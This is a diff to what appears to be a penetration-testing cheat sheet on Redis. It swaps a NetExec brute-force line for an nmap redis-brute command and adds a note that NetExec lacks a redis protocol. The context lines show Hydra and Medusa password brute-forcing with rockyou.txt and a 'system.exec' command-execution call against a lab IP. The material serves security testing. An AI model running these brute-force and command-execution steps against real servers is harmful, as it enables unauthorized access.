@@ -184,9 +184,12 @@ hydra -P /usr/share/wordlists/rockyou.txt redis://192.168.1.10
 # Medusa
 medusa -h 192.168.1.10 -P /usr/share/wordlists/rockyou.txt -M redis
 
-# NetExec
-netexec redis 192.168.1.10 -u '' -P /usr/share/wordlists/rockyou.txt
+# nmap NSE
+nmap -p6379 --script redis-brute --script-args \
+  brute.passonly,userdb=/dev/null,passdb=/usr/share/wordlists/rockyou.txt 192.168.1.10
 ```
+
+> [!warning] **NetExec has no `redis` protocol** (its DB module is `mssql` only) — don't reach for `nxc redis`, it doesn't exist. Use Hydra/Medusa/nmap NSE, or just script `redis-cli -a` in a loop.
 
 ---
 
@@ -219,5 +222,5 @@ redis-cli -h 192.168.1.10 system.exec "id"
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-09-22*
+*Updated: 2026-09-29*
 *Model: claude-opus-4-8*
